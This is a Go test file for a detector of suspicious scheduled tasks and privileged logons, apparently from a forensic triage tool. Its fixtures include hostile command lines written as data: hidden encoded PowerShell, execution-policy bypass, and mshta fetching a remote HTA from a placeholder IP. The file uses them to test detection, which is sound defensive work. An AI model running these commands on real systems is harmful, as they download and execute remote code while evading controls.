package detect

import (
	"strings"
	"testing"

	"tracefall/internal/model"
)

func taskEvent(id, name, user, cmdline, proc string) model.Event {
	return model.Event{ID: id, CaseID: "c", EventType: model.EventScheduledTaskCreate, User: user, ProcessName: proc, CommandLine: cmdline,
		Extra: map[string]string{"task_name": name}}
}

func TestNewScheduledTask_UndatedRegistrationIsNotPrintedAsYearOne(t *testing.T) {
	got := newScheduledTask{}.Evaluate([]model.Event{taskEvent("1", "Cleanup", "", `C:\Tools\clean.exe`, "clean.exe")})
	if len(got) != 1 {
		t.Fatalf("got %d findings", len(got))
	}
	if strings.Contains(got[0].Description, "0001-01-01") {
		t.Errorf("an unrecorded date must not appear as a time: %s", got[0].Description)
	}
	if !strings.Contains(got[0].Description, "registration date is not recorded") {
		t.Errorf("description must say the date is not recorded: %s", got[0].Description)
	}
}

func TestNewScheduledTask_StockSystemDirectoryInterpreterIsNotHigh(t *testing.T) {
	stock := taskEvent("s", "Stock", "", `%windir%\system32\rundll32.exe aepdu.dll,AePduRunUpdate`, "rundll32.exe")
	stock2 := taskEvent("s2", "Stock2", "", `%systemroot%\system32\cscript.exe %systemroot%\system32\tool.vbs`, "cscript.exe")
	hostile := taskEvent("h", "Hostile", "", `powershell.exe -nop -w hidden -enc SQBFAFgA`, "powershell.exe")
	remote := taskEvent("r", "Remote", "", `mshta.exe http://203.0.113.9/a.hta`, "mshta.exe")
	temp := taskEvent("t", "Temp", "", `C:\Users\alice\AppData\Local\Temp\x.exe`, "x.exe")
	sev := map[string]string{}
	for _, f := range (newScheduledTask{}).Evaluate([]model.Event{stock, stock2, hostile, remote, temp}) {
		sev[f.SupportingEvents[0]] = f.Severity
	}
	for _, id := range []string{"s", "s2"} {
		if sev[id] == model.SeverityHigh {
			t.Errorf("%s: a stock system-directory task action must not be high", id)
		}
	}
	for _, id := range []string{"h", "r", "t"} {
		if sev[id] != model.SeverityHigh {
			t.Errorf("%s: severity %q, want high", id, sev[id])
		}
	}
}

func TestHasHostileInvocation_PowerShellAbbreviations(t *testing.T) {
	for _, c := range []string{`powershell -ec SQBFAFgA`, `powershell -ep bypass -File x.ps1`, `powershell -w 1 -c calc`, `powershell -e SQBFAFgA`, `powershell -nop`} {
		if !hasHostileInvocation(c) {
			t.Errorf("%q not recognised", c)
		}
	}
	for _, c := range []string{`%windir%\system32\rundll32.exe aepdu.dll,AePduRunUpdate`, `powershell -File C:\Scripts\backup.ps1`} {
		if hasHostileInvocation(c) {
			t.Errorf("%q wrongly flagged", c)
		}
	}
}

func TestPrivilegedLogon_UnknownHostsAreNotMergedAcrossCollections(t *testing.T) {
	a := privEvent("a", "", "alice", mustTime("2026-01-15T09:00:00Z"), "0x1")
	a.CollectionID = "col1"
	b := privEvent("b", "", "alice", mustTime("2026-01-15T10:00:00Z"), "0x2")
	b.CollectionID = "col2"
	if got := (privilegedLogonObserved{}).Evaluate([]model.Event{a, b}); len(got) != 2 {
		t.Fatalf("got %d findings, want 2: an unrecorded host is not a shared host", len(got))
	}
}
